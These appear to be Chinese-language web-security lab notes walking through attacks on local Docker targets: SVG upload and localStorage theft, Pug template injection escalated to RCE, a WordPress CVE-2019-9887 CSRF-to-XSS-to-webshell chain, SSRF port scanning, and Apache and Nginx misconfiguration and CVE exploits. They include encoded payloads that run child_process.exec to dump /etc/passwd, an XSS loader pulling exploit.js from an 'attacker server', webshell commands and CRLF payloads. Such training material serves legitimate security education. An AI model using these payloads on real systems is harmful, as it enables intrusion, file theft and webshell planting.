HTML5 中最酷的特性就是本地存储。有一点像比较老的技术 Cookie 和客户端数据库的融合。它比 Cookie 更好用因为支持多个 Windows 存储，它拥有更好的安全和性能，即使浏览器关闭后也可以保存。 

HTML 添加了基于 SVG、Canvas、WebGL 及 CSS3 的 3D 功能，可以在浏览器中呈现更好的视觉效果。 



#### SVG

- SVG（Scalable Vector Graphics）意为可缩放矢量图形，这是一种使用 XML 格式定义图像的方式。 
- SVG 文件实例 ：HackerMeCode\HTML5\SVGExample.svg
- SVG 中的 JS ：HackerMeCode\HTML5\SVGJSExample.svg
  - 当访问上面的 SVG 文件定义的图片时 ，弹出一个对话框



#### Web Storage

- Web Storage 包含两个部分，一部分是 sessionStorage，另一部分是 localStorage。
  - sessionStorage：用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。
  - localStorage： 用户持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。
- 新的 HTML5 Web 存储 API 使 Web 开发人员可以在用户的计算机上存储大约 5 兆字节的数据（而 Cookie 中仅允许 4KB 的数据）。 



#### SVG 与文件上传漏洞

- 首先，构建一个 SVG 文件，示例程序：HackerMeCode\HTML5\SVGUploadExample.svg
- 启动 bWAPP 靶机，安装，Choose your bug: Unrestricted File Upload
- 浏览，上传文件：SVGUploadExample.svg，点击 upload
- 浏览器输入网址查看，http://127.0.0.1/images/SVGUploadExample.svg
  - 备注：需要使用 Google Chrome 浏览器
  - 输入用户名和密码之后，就可以看到网址跳转到 example.com 中
- 漏洞利用过程分析
  - ![1618818207352](HackerMeWeb.assets/1618818207352.png)



#### 本地存储 

- 构建本地存储HTML 文件，示例程序：HackerMeCode\HTML5\SVGUploadStorageExample.html
- 使用浏览器打开文件，再打开控制台
- 可以在控制台存储中，选择本地存储，看到对应的 key-value 内容
- ![1618818857801](HackerMeWeb.assets/1618818857801.png)
- 通过SVG，盗取本地存储 
  - 构建svg文件，示例程序：HackerMeCode\HTML5\SVGRECTExample.svg
  - 接着重新加载 SVGUploadStorageExample.html 到浏览器
  - 接着在同一个浏览器中打开 SVGRECTExample.svg 文件，打开控制台，就可以在 Console 中看到对应的输出
  - ![1618819449483](HackerMeWeb.assets/1618819449483.png)



#### 同源策略

- 用于限制来自某一个源的文件对另一个源的文件进行读写等操作，只有同源的脚本才能读写本源的 Cookie、Session、AJAX 等操作的权限 。



#### CORS（跨源资源共享） 定义

- 只要确定了不同源的请求是否被许可，就可以获得相应的文件内容。
  - ![1618820331202](HackerMeWeb.assets/1618820331202.png)

- 远程文件包含
  - 服务器上的文件包含： 
    - ![1618820402360](HackerMeWeb.assets/1618820402360.png)
  - 浏览器上的文件包含： 
    - ![1618820450333](HackerMeWeb.assets/1618820450333.png)
- 新·远程文件包含
  - CORS（跨源资源共享）为远程文件包含提供了可能，只要建立起源之间的信任关系，就可以触发远程文件包含。 



#### CORS 测试

- 源 A：w1.example.com  源 B：w2.example.com 
- 源 A 跨域向源 B 传递参数 ，访问源 A： 点击start后发送一个数据包 ，包含 Origin 的字段
  - ![1618820639445](HackerMeWeb.assets/1618820639445.png)
- 发送数据包后，浏览器会拦截跨源请求，在 Console 中输出 CORS 头缺少字段的警告，但是此时 源B 是已经成功返回数据包了的，只是浏览器阻拦了最终的显示
  - ![1618820751367](HackerMeWeb.assets/1618820751367.png)
- 修改ajax.php ，添加上 CORS 需要的头部字段，此时源B响应的数据包就多了一个进入控制允许源的字段
  - ![1618820827335](HackerMeWeb.assets/1618820827335.png)
  - 此时浏览器的控制台中没有非同源的警告内容
  - ![1618820863725](HackerMeWeb.assets/1618820863725.png)



#### CORS安全性分析 

- CORS 绕过了浏览器同源策略的限制，增强了内容之间的共享性。但是 CORS 完全是一个盲目的协议，只通过 HTTP 头中携带的信息进行控制。 
- 同源策略（无CORS） 
  - ![1618820986725](HackerMeWeb.assets/1618820986725.png)
- 同源策略（有CORS） 
  - ![1618821035493](HackerMeWeb.assets/1618821035493.png)
- 场景模拟 
  - 当主站与子站通过 CORS 建立信任关系进行资源共享时，如果攻击者控制了子站，也可以获取主站的数据。 
  - ![1618821114617](HackerMeWeb.assets/1618821114617.png)
  - ![1618821158747](HackerMeWeb.assets/1618821158747.png)
  - ![1618821194070](HackerMeWeb.assets/1618821194070.png)
  - ![1618821218543](HackerMeWeb.assets/1618821218543.png)



### XSS 与模版注入 

#### JavaScript

- 作为前端开发语言：一般关联前端安全问题，如 XSS,CSRF, JS 劫持。
- 受害者主体：浏览网站的用户
- 作为后端开发语言：运行于 Node.js，关联后端问题，注入及远程命令执行
- 受害者主体：服务器网站 



#### Node.js

- Node.js 允许你在浏览器之外运行 JavaScript。由于 Node.js 具有精简，快速和跨平台的特性， 所以它可以通过统一堆栈来大大简化项目。
- 虽然 Node.js 不是Web 服务器，但它允许服务器（可以用 JavaScript 编程的东西）存在于实际 Web客户端之外的环境中。
- 随着 Node.js 越来越流行，它的安全问题是黑客与安全研究人员的焦点。 
- Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。 Node.js 使用了一个事件驱动、非阻塞式 I/O 的模型。
- Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与 PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。 



#### 模版引擎

- 模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。 



#### Pug 模版引擎

- Pug 是一款健壮、灵活、功能丰富的 HTML 模板引擎,专门为 Node.js 平台开发。Pug是由 Jade 改名而来。
- Pug 通过缩进（表示标签间的嵌套关系）的方式来编写代码的过程，在编译的过程中，不需要考虑标签是否闭合的问题。 



#### Pug 模版引擎示例 

- 安装 pug
  - 打开 终端，输入 npm install -g pug-cli ，前提是安装了 npm
  - 然后就等着安装完成即可
- pug 模板
  - 示例程序：HackerMeCode\PUG\PUG.pug
- 渲染为 html
  - 如果在 Webstorm 中写 pug，会默认直接渲染出来，只需要点击就可以在浏览器中显示出来
  - 否则的话，需要打开 终端 ，输入命令：pug -P -w .\pug.pug ，w表示实时监控文件，并渲染内容
  - ![1618823581427](HackerMeWeb.assets/1618823581427.png)
  - 执行 pug 命令。能够生成 html 文件，-w 提供实时监控，当 pug 文件改变时，html 同时改变。
  - 模版引擎 便于数据与代码分离， 提供了转义功能。天生具有对 XSS 的防御效果。但是实际上产生了另一种问题。模版注入。 
- 渲染后的html文件内容为：HackerMeCode\PUG\PUG.html
  - 双击在浏览器打开，就弹出了对话框，内容为2



#### 模板注入

- 服务端接受用户的输入，并将其作为 Web 应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。
- 这可以在 wiki，WSYWIG 或电子邮件模板中恶意使用。这种情况很少发生在无意中，所以它经常被误解为只是 XSS。 



#### Pug XSS 测试

- pug 靶机安装
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/chatsys:latest
  - docker run --name=pug -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/chatsys 
- 浏览器访问：http://127.0.0.1/
- 进入 pug xss 攻击
  - http://127.0.0.1/xss
  - 下载 xss 源码文件
    - 在 XSS 中，点击 Pug XSS template，就可以将模板的源文件下载下来，示例文件：HackerMeCode\PUG\templateExample.pug
  - Exercise 1：**Escaped String Interpolation**
    - 输入：<script>alert(1);</script>
    - 点击 submit 后点开Exercise 1，可以看到 No results found for <script>alert(1);</script>
    - 此时的 输入被 pug 进行了转义操作
    - 查看源码，可以看到 `\#{name1}`
  - Exercise 2：**Unescaped String Interpolation**
    - 输入：<script>alert(1);</script>
    - 点击 submit 后，会弹出内容为1的对话框
    - 查看源码，可以看到 `! {name2}`
  - Exercise 3：**Escaped String Interpolation into dynamic inline Javascript**
    - 输入：1;alert(123);
    - 点击 submit 后，会弹出内容为123的对话框，点开Exercise 3，可以看到 No results found for 1;alert(123);
    - 查看源码，可以看到 `var user3 = \#{name3};`



#### Pug 模版注入 

- 安装并启动漏洞容器，并且启动 BurpSuite，Switchhost，访问：http://xforburp.com/
- 登录 login
  - username:123
  - password:123
- 进入 directmessage SSRF
  - http://xforburp.com/directmessage
  - 输入内容并测试：
    - Send message to user: <script>alert(1);</script>
    - Comment:123
    - Link:1234
    - 在BurpSuite中，打开 Intercept is on，点击 Send
    - 可以在 BurpSuite 中看一个请求信息，如下所示，点击 Forward 后，继续发送请求包。
      - 备注：按照道理说，是不会触发 XSS 的，但是目前竟然触发了XSS ，并且有一个弹框，内容为1
      - 并且每一次测试，之后都是需要重新登录的
    - ![1618829624306](HackerMeWeb.assets/1618829624306.png)
  - 使用 8*8 测试
    - Send message to user: 8*8，其他随便填写
    - 此时发送的请求包为：
      - ![1618829875681](HackerMeWeb.assets/1618829875681.png)
    - 收到的响应包为：
      - ![1618829890194](HackerMeWeb.assets/1618829890194.png)
    - 可以思考内部的逻辑可能是 p Message has been sent to !{user} 
  - 使用 %0a%3d8*8 测试
    - Send message to user: %0a%3d8*8，其他随便填写
      - 备注：这个时候，需要自己随便输入一个数字，借助 BurpSuite 进行请求参数的更换
    - 此时发送的请求包为：
      - ![1618830076583](HackerMeWeb.assets/1618830076583.png)
    - 收到的响应包为：
      - ![1618830132095](HackerMeWeb.assets/1618830132095.png)
    - %0a --> 实现了换行操作；%3d --> 实现了一个等号 =；进而导致后面的 8*8 进行了运算，得到 64
    - 类似于
      - p Message has bee sent to username 
      - p Message has bee sent to
        =8*8 
  - 内部实现 
    - docker exec -it pug bash
    - cd /opt/web/chatSupportSystems/views
    - vim directmessage.pug



### JavaScript 与 RCE 

#### RCE

- RCE（远程命令（代码）执行） 
- 程序对输入检测不到位，导致攻击者能够执行非预期的代码或系统命令。从而能够获取 Websh ell ，取得对主机的控制权限。每次入侵和 Web 应用程序渗透测试中必须寻找的 。
- 受害者主体：网站服务器。 



#### JavaScript 与 RCE

- 在 Node.js 项目中，使用 JavaScript 作为开发语言，如果出现模版注入漏洞，往往会升级成为 RCE（远程命令执行）。 
- 模版注入 
  - 在 pug 模板测试中，使用 %0a%3d8*8 测试，可以实现注入漏洞实验
- 注入的时候，要获得 shell 执行，我们必须找到正确的函数来在 Node/JavaScript 中执行。
- JavaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即全局变量。
- 在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。
- 我们将识别自身全局对象的根节点，然后继续确定我们可以访问哪些模块和功能。我们在 Pug 中，“=”字符允许我们输出 JavaScript 结果。 



#### RCE 测试

- Shell 执行 

  - 希望最终使用 Require 函数导入 child_process.exec 以运行操作系统命令 

- 使用 %0a%3dglobal 测试

  - 复用之前 http://xforburp.com/directmessage 的实验结果， 使用 Repeater 功能，进行重放操作
  - 更改后的请求信息为，`GET /ti?user=%0a%3dglobal&comment=22333&link=ioio090 HTTP/1.1`
  - 返回 [object global]

- 搜索 Require 方法，遍历 Global 

  - ```sh
    each val,index in global
     p=index
    ```

  - 将上述语句encode成为HTML内容，

  - 更改后的请求信息为，`GET /ti?user=%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0a%20%70%3d%69%6e%64%65%78&comment=22333&link=ioio090 HTTP/1.1`

- 遍历 global.process 

  - ```sh
    each val,index in global.process
     p=index
    ```

  - 继续 encode，更改后的请求信息为，`GET /ti?user=%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%70%3d%69%6e%64%65%78&comment=22333&link=ioio090 HTTP/1.1`

- 遍历 global.process.mainModule 

  - ```sh
    each val,index in global.process.mainModule
     p=index
    ```

  - 继续 encode，更改后的请求信息为，`GET /ti?user=%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%69%6e%64%65%78%0a&comment=22333&link=ioio090 HTTP/1.1`

- RCE 利用

  - ```sh
    - var x = global.process.mainModule.require
    - x('child_process').exec('cat /etc/passwd >> /opt/web/chatSupportSystems/public/account.txt')
    ```

  - 继续 encode，更改后的请求信息为，`GET /ti?user=%0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%0a%2d%20%78%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70%70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63%2f%61%63%63%6f%75%6e%74%2e%74%78%74%27%29&comment=22333&link=ioio090 HTTP/1.1`

- 浏览器访问 account.txt 文件

  - 输入网址：http://127.0.0.1/account.txt

- 登录docker

  - docker exec -it pug bash
  - cd /opt/web/chatSupportSystems/public
  - vim account.txt



#### Tplmap 自动化注入 

- Tplmap 这是一个用于自动化模版注入的工具，使用方式类似 SQLmap
  - 网站：https://github.com/epinna/tplmap
- ./tplmap.py -u "http://127.0.0.1/ti?user=123*;5D&comment=&link=" 
- ![1618834807706](HackerMeWeb.assets/1618834807706.png)



### 从 CSRF 到 RCE 

#### WordPress

一款内容管理系统软件（CMS），它是使用 PHP 语言和 MySQL 数据库开发的, 用户可以轻松构建属于自己的网站。根据它的下载量估算，超过33%的互联网网站使用 WordPress。 



#### CVE-2019-9887

2019年3月，一家从事开发静态代码分析软件的公司，公布了一个 CSRF 漏洞（后变更为 XSS 漏洞），影响了低于5.1.1的多个版本的 WordPress,且在默认配置。

漏洞是源于2009年的防御机制设计失误。 



#### WordPress 之 Nonce 安全机制 

- Nonce 是加密散列，用来验证是否是正确的人或客户端所发送的请求。因为Nonce 是由字母与数字结合的hash值构成，（例如 md5，sha1，sha2），是WordPress 中的 token,安全令牌，一般来说不太可能创建一个假的 Nonce。 
  - ![1618887087280](HackerMeWeb.assets/1618887087280.png)
- wp-includes/pluggable.php 
  - WordPress Nonce 是 WordPress 2.5版本引入的，它可以在某段时间内一直有效，这里默认一天。
  - 从技术上讲 WordPress Nonce 可以使用不止一次，但仅限这个定义的时间段里。不能抵御重放攻击。
  - 而且与 \$i 是由时间决定的随机数，每天的 0 时与 12 时更新一次；\$action 是操作；​\$uid 是用户 ID；​\$token是用户登陆时服务器产生的，每次登陆都不同。 
  - ![1618887210885](HackerMeWeb.assets/1618887210885.png)
- 为什么使用 Nonce 
  - http://example.com/wp-admin/post.php?post=123&action=trash
  - `<img src="http://example.com/wp-admin/post.php?post=123&action=trash" />`
  - http://example.com/wp-admin/post.php?post=123&action=trash&_wpnonce=b192fc4204 
  - 只有请求中的_wpnonce 与预期的相等，该请求才会被处理，URL 就很难被伪造。 
- 漏洞根源 
  - /wp-admin/edit.php 
  - /wp-includes/pluggable.php 
  - ![1618887359765](HackerMeWeb.assets/1618887359765.png)
  - ![1618887418837](HackerMeWeb.assets/1618887418837.png)
  - 当我们在后台编辑文章的时候会执行该段代码，进入 check_admin_referer 
  - /wp-includes/comment.php 
  - /wp-includes/kses.php 
  - ![1618887465820](HackerMeWeb.assets/1618887465820.png)
  - WordPress 在处理高权限用户的评论的时候，并不会进行过滤即便是<script>脚本。
  - 在 WordPress Core 开发团队的认知中，任何一个 WordPress 的超级管理员，都应该保管好自己的网站以及账号安全，超级管理员也应该能对自己的网站以及服务器负责。在这样的观点设计下，WordPress 的超级管理员可以直接修改后台插件模板来 GetShell，超级管理员的评论不会有任何过滤。
  - 但是在处理 Nonce 机制的时候有点问题。
  - 高权限用户若 Nonce 验证通过，则不限制输入，如过 Nonce 验证不通过，则进行wp_filter_post_kses 过滤。代码如上所示。 
  - /wp-includes/kses.php 
  - ![1618887662005](HackerMeWeb.assets/1618887662005.png)
  - ![1618887713388](HackerMeWeb.assets/1618887713388.png)
  - 他们都仅仅允许基础的 HTML 标签和属性，虽然 wp_filter_post_kses 稍微宽松一点，但是也移除了能够导致跨站脚本攻击的标签。 
  - wp-includes/formatting.php 
  - ![1618887798769](HackerMeWeb.assets/1618887798769.png)
  - 原文本：
    - <a title='Xss " onmouseover=alert(1) id=" ' rel='111'>please click me 
  - 处理后（单引号变成了双引号）： 
    - <a title="Xss" onmouseover =alert(1) id=" " rel='111'>please click me 
- CSRF->XSS->RCE 攻击链 
  - ![1618887857999](HackerMeWeb.assets/1618887857999.png)



#### 安装 xsstorce  容器

- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
- 漏洞容器
- docker run --name=xsstorce -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
  - 攻击者远程服务器
  - docker run --name=xsstorceAttack -d -p 0.0.0.0:82:80 registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
- docker ps
- 浏览器访问：http://127.0.0.1/
  - 填写 WordPress 信息，实现内容网站创建
  - 管理员控制台访问：http://127.0.0.1/wp-admin/
  - 备注：版本为 WordPress 5.1 



#### CSRF to XSS 测试

- CSRF POC 制作
  - 登录高权限账号评论并截取上传报文，制作 POC，利用代码：
  - <a title='Xss " onmouseover=alert(1) id=" ' rel='111'>please click me 
  - 但是呢，这个功能需要 BurpSuite 是 专业版才可以
  - ![1618889676965](HackerMeWeb.assets/1618889676965.png)
- 查看上传评论的 form 表单源文件
  - 网址：http://127.0.0.1/2021/04/20/hello-world/
  - 在 Leave a comment 中，打开控制台，在 Elements 中找到 from 表单，看内部提交 submit 的时候，携带的key-value 内容
- 制作 POC 文件
  - 基于上传评论的时候，需要提交的键值对，自己造一个form 表单
  - 示例程序：HackerMeCode\WordPress\CommentPOC.html
  - 在浏览器中打开 POC，但是前提是需要使用高权限用户登录，如 admin 账户，才可以进行后续的测试
  - 点击 Submit request 就可以完成 XSS
- 查看 XSS 结果
  - 刷新：http://127.0.0.1/2021/04/20/hello-world/
  - 在下面就可以看到一条新的 评论，展示为 click me here
  - 此时只需要将鼠标悬停在 click 的上面，就可以实现弹窗的出现，内容为 1



####  XSS 到 RCE  测试

- 插件利用（Hello_Dolly）

  - 世界上第一个 WordPress 的插件，启用之后，可以在后台的右上角随机显示《Hello Dolly》这首歌里面的一句歌词。
  - WordPress 可以使用插件，通过 JS 往插件中写入后门完成 GetShell。 

- 恶意 JavaScript 文件 

  - 可以访问本机82端口的 WordPress 看到js 文件，
  - http://127.0.0.1:82/exploit.js

- 构建 Exploit 

  - ```javascript
    <a title='hacker " onclick="var s=document.createElement('script');s.setAttribute('src','http://127.0.0.1:82/exploit.js');s.onload=document.body.appendChild(s);" id="' rel="123">Exploit
    ```

  - 将上述内容，进行拆解之后得到

    - ![1618891575177](HackerMeWeb.assets/1618891575177.png)

- CSRF 利用脚本 

  - 将 Exploit 的内容放到 POC 中 comment 的 value 中
  - 示例程序：HackerMeCode\WordPress\CommentRCEPOC.html

- 执行 POC

  - 浏览器打开 CommentRCEPOC.html
  - 点击 Submit request
  - 打开 http://127.0.0.1/2021/04/20/hello-world/
  - 找到构建的 Exploit  链接，并点击

- GetShell 

  - 访问：http://127.0.0.1/wp-content/plugins/hello.php?cmd=id
    - 可以看到 uid=33(www-data) gid=33(www-data) groups=33(www-data)
    - 备注：如果无法实现 getshell，需要重新登录 80端口和82端口的 WordPress，必须是127的形式登录，不能是 xforburp 的混合形式
  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=ls%20-al
  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=whoami
  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=ifconfig

- CSRF->XSS->RCE 攻击链 

  - ![1618892184952](HackerMeWeb.assets/1618892184952.png)





### SSRF 

#### SSRF 定义

- SSRF（Server-Side Request Forgery）服务器请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。 
  - ![1618893936646](HackerMeWeb.assets/1618893936646.png)
- 特点：
  - 攻击者机器无法直接访问目标机器2的服务
  - 目标机器1能够访问目标机器2的服务
  - 目标机器1暴露了访问目标机器2的方式，黑客能够利用
  - ![1618894073642](HackerMeWeb.assets/1618894073642.png)
- 危害:
  - 敏感信息泄露
  - 攻击内网主机、应用
  - 被作为一个跳板持续进行攻击 



#### SSRF 测试

- 安装pug靶机，docker pull registry.cn-shanghai.aliyuncs.com/yhskc/chatsys:latest
- 启动 BurpSuite，SwitchHost
- 访问测试：
  - http://127.0.0.1/
- 登录，123/123，访问 SSRF，Direct Message link，http://127.0.0.1/directmessage
- 输入内容：
  - Send message to user: 111
  - Comment:222
  - Link:  https://www.baidu.com/
  - 点击 Preview link，可以看到页面显示了 百度 的首页，但是浏览器并不只是直接访问获得的，而是使用了 SSRF 获得的
- 测试访问本站
  - Link：http://xforburp.com/ssrf?user=test01&comment=001&link=http://127.0.0.1:80
  - 可以看到能够访问本站
- 使用 BurpSuite 的 Intruder 测试端口
  - 选择请求为 GET /ssrf?user=test01&comment=001&link=http://127.0.0.1:80 HTTP/1.1 的包，右键 Send to Intruder 
  - 在 Positions 中，只保留 端口 80，如：GET /ssrf?user=test01&comment=001&link=http://127.0.0.1:§80§ HTTP/1.1
  - 在 Payload Sets 中，
    - 选择 Payload type：Numbers
    - Number range：From: 28000 -- 28100
  - 开始攻击，Start attack
  - 在弹出框中，可以看到 端口 为 28017 的时候，返回内容的长度 和其他的不一样
- 测试 28017 端口
  - Link：http://xforburp.com/ssrf?user=test01&comment=001&link=http://127.0.0.1:28017
    - 可以看到  mongod  的相关信息
  - Link：http://xforburp.com/ssrf?user=test01&comment=001&link=http://127.0.0.1:28017/_commands
    - 看到 **MongoDB** 的命令列表
  - Link：http://xforburp.com/ssrf?user=test01&comment=001&link=http://127.0.0.1:28017/serverStatus
    - 查看服务器的状态信息
  - Link：http://xforburp.com:28017/
    - 直接使用端口访问，是无法访问的





## 容器安全

### Web 容器

- Web 服务器：
  - 提供 Web 服务器的软件或主机，即 Web 服务器软件或者装有 Web 服务器软件的计算机。 
- Web 中间件：
  - 提供系统软件与应用软件之间连接的软件，Web 中间件是提供 Web 应用软件和系统软件连接的软件的总称。 
- Web 容器： 
  - 容器是中间件的一种，它给处于其中的应用程序组件提供从一个环境，使应用程序直接与容器中的环境变量进行交互而不必关注其他的系统问题。Web 容器用于给处于其中的应用程序组件提供一个环境。 
- 关系图
  - ![1618907816935](HackerMeWeb.assets/1618907816935.png)
- Web 请求调用关系
  - ![1618907847401](HackerMeWeb.assets/1618907847401.png)
- 常见 Web 容器
  - Apache
  - Nginx
  - Tomcat 



### Apache 安全 

#### 配置文件错误 

- 多后缀解析 php 漏洞

  - AddHandler application/x-httpd-php .php
  - AddHandler 为相应的文件扩展名指定处理程序
  - 将扩展名为 .php 的文件交给 x-httpd-php 程序处理 

- 多后缀解析流程

  - Apache 识别文件扩展名是从前往后的，如果遇到了无法识别的扩展名会接着往后识别，遇到的第一个可以识别的扩展名作为该文件的扩展名。 
  - ![1618908063365](HackerMeWeb.assets/1618908063365.png)

- bWAPP 靶机测试

  - 安装，启动靶机，访问 http://127.0.0.1/portal.php

  - 选择 Unrestricted File Upload bug，等级选择 High，http://127.0.0.1/unrestricted_file_upload.php

  - 在难度为 high 情况下，只允许扩展名为 jpg,png （`$file_extensions  = array("jpeg", "jpg", "png", "gif")`）的文件上传 

    - 源码查看
      - docker exec -it bwapp bash
      - cd /var/www/html
      - vim unrestricted_file_upload.php
      - vim functions_external.php
      - ![1618908492019](HackerMeWeb.assets/1618908492019.png)

  - 创建 test.php.xyz.jpg 文件

    - 示例文件：HackerMeCode\UnrestrictedFileUpload\test.php.xyz.jpg
    - 后缀解析漏洞利用原理：
      - Apache 从前往后获取第一个可以识别的扩展名
      - Web 应用从后往前获取第一个扩展名
      - 将文件的最后一个扩展名设置为 Web 应用程序允许上传的扩展名
      - 将文件的第一个扩展名设置为 Apache 可以识别的脚本类型 
      - ![1618908989332](HackerMeWeb.assets/1618908989332.png)

  - 漏洞测试

    - 上传文件，test.php.xyz.jpg

    - 访问，http://127.0.0.1/images/test.php.xyz.jpg

    - 只能将文件，当成是图片查看，无法实现漏洞利用

    - 方式一：

      - 添加多后缀解析配置，`AddHandler application/x-httpd-php .php`

      - 靶场中的 Apache 中的配置，可以正常的解析 php 

      - docker exec -it bwapp bash

      - cd /etc/apache2/conf-enabled/

      - vim docker-php.conf

        - ```xml
          AddHandler application/x-httpd-php .php
          
          DirectoryIndex disabled
          DirectoryIndex index.php index.html
          
          <Directory /var/www/>
          	Options -Indexes
          	AllowOverride All
          </Directory>
          ```

      - 访问，http://127.0.0.1/images/test.php.xyz.jpg

    - 方式二：

      - docker exec -it bwapp bash
      - cd /var/www/html/
      - echo "AddHandler application/x-httpd-php .php" > .htaccess
      - cat .htaccess
      - 访问，http://127.0.0.1/images/test.php.xyz.jpg
        - 此时上传的文件，就被当做 php 文件执行 





#### 0day 或 Nday 漏洞 ：CVE-2017-15715

- 0day 漏洞： 
  - 0day 漏洞是指负责应用程序的程序员或供应商所未知的软件缺陷。因为该漏洞未知，所以没有可用的补丁程序。 
- Nday 漏洞： 
  - 就是这个漏洞已经公布出来了 N 天了 
- Nday:CVE-2017-15715 
  - 影响版本：Apache 2.4.10 -2.4.29
  - 漏洞利用：文件上传 
  - 漏洞名称：换行解析漏洞 
- apache 漏洞靶场安装
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/apache01:latest 
  - docker run --name=apache -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/apache01:latest
  - 访问：http://127.0.0.1/
- 过滤措施: 
  - docker exec -it apache bash
  - more index.php
    - 由于无法安装 vi 和 vim 只能使用more 查看内容
  - ![1618911031406](HackerMeWeb.assets/1618911031406.png)
- 上传 .php 文件 
  - 示例程序：HackerMeCode\Apache\test.php
  - 此时一定返回一个 bad file，是因为服务器使用黑名单的方式给过滤掉了
- 重新上传，在文件的扩展名后添加 0a 
  - 使用 Burp Suite 拦截 POST 请求，并右键 Send to  Repeater
  - 在 1.php 的后面加一个 空格，然后选中空格，点开右边栏 INSPECTOR，更改第二项 CODE 中的20为 0a，并且点击 Apply changes，会看到多了一个换行
  - 发送请求 Send，可以看到响应中就不是 bad file 了
- 上传成功并访问该文件 
  - http://xforburp.com/1.php%0a
  - 此时就可以看到 PHP Version 5.5.38 等信息
- 上传过程 
  - ![1618911675626](HackerMeWeb.assets/1618911675626.png)
- 解析过程
  - ![1618911689041](HackerMeWeb.assets/1618911689041.png)



### Nginx 安全 

#### Nginx 简介 

- Nginx （engine x）是一个高性能的 HTTP 和反向代理 Web 服务器，同时也提供了IMAP/POP3/SMTP 服务。
- 中国大陆使用 Nginx 网站用户有：百度、京东、新浪、网易、腾讯等。
- Nginx 可以在大多数 Unix、Linux 编译运行，也有 Windows 移植版。 



#### 配置文件错误 

- 安装 nginx 靶机

  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/nginx:latest
  - docker run --name=nginx –d –p 0.0.0.0:8080:8080 registry.cn-shanghai.aliyuncs.com/yhskc/nginx:latest
  - 访问测试：
    - http://127.0.0.1:8080/

- CRLF 注入 

  - CRLF：就是 CR 和 LF，分别表示回车和换行， CR 命令让打印头回到左边。LF 命令让纸前进一行。

  - 在 HTTP 报文中，行与行之间使用 CRLF 间隔。

  - 攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞（HTTP Response Splitting）。 

  - 在 Nginx 中配置文件中，有三个可以接受 URL 的变量：

    - 1.$URI
    - 2.$DOCUMENT_URI
    - 3.$REQUEST_URI

  - 其中：

    - 1.$URI- 获取解码后的请求路径
    - 2.$DOCUMENT_URI- 获取解码后的请求路径
    - 3.$REQUEST_URI- 没有解码的完整的 URL 

  - Nginx server 配置

    - ```nginx
      server {
      	listen 8080;
          root /usr/share/nginx/html;
          index index.html;
          server_name _;
          location / {
              return 302 https://$host$uri;
          }
      }
      ```

  - nginx 漏洞访问网址

    - http://ip:port/%0a%0dSet-Cookie:%20a=test 

  - 使用 BurpSuite 截取数据包

    - 修改 URL 后发送的数据包 ，服务器对该数据包的响应 
      - 备注：实际测试的时候，失败了，没有获得服务器的响应内容
    - ![1618914840557](HackerMeWeb.assets/1618914840557.png)
    - 后续使用正常的任意请求，都会携带 Cookie: a=test  的信息
      - ![1618914964475](HackerMeWeb.assets/1618914964475.png)

#### 0day 或 Nday 漏洞 ：CVE–2017–7529

- 安装靶机

  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/nginx01:latest 
  - docker run --name=nginx01 –d –p 0.0.0.0:8080:8080 registry.cn-shanghai.aliyuncs.com/yhskc/nginx01:latest
  - 或者使用 compose 方式启动
    - 启动文件，HackerMeCode\Nginx\docker-compose.yml，命令：docker-compose up -d
    - 访问`http://127.0.0.1:8080/`，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。

- 越界读取缓存漏洞 

  - CVE 编号：CVE–2017–7529
  - 影响版本：0.5.6 - 1.13.2
  - 漏洞危害：敏感信息泄露 

- HTTP-Range

  - HTTP 的 Range 允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range 来并发下载；如果访问资源时网络中断，可以断点续传。

  - Range 设置在 HTTP 请求头中，它是多个 byte-range-spec（或suffix-byte-rangespec）的集合。 

  - HTTP-Range 

    - byte-range-set = ( byte-range-spec | suffix-byte-range-spec )*N
    - byte-range-spec = first-byte-pos "-" [last-byte-pos]
